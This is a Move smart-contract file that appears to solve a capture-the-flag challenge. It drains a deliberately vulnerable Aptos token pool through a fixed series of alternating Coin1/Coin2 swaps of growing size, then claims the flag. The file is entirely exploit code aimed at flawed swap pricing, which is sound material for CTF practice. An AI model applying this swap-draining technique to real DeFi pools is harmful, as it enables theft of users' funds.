module solution::solution3 {

    use std::signer;
    use std::vector;

    use aptos_framework::coin::{Self, Coin};

    use ctfmovement::pool::{Self, Coin1, Coin2};

    public entry fun solve(account: &signer) {
        pool::get_coin(account);

        let coin2 = coin::withdraw<Coin2>(account, 5);
        let coin1 = pool::swap_21(&mut coin2, 5);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin1 = coin::withdraw<Coin1>(account, 10);
        let coin2 = pool::swap_12(&mut coin1, 10);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin2 = coin::withdraw<Coin2>(account, 12);
        let coin1 = pool::swap_21(&mut coin2, 12);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin1 = coin::withdraw<Coin1>(account, 15);
        let coin2 = pool::swap_12(&mut coin1, 15);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin2 = coin::withdraw<Coin2>(account, 20);
        let coin1 = pool::swap_21(&mut coin2, 20);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin1 = coin::withdraw<Coin1>(account, 24);
        let coin2 = pool::swap_12(&mut coin1, 24);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        pool::get_flag(account);
    }
}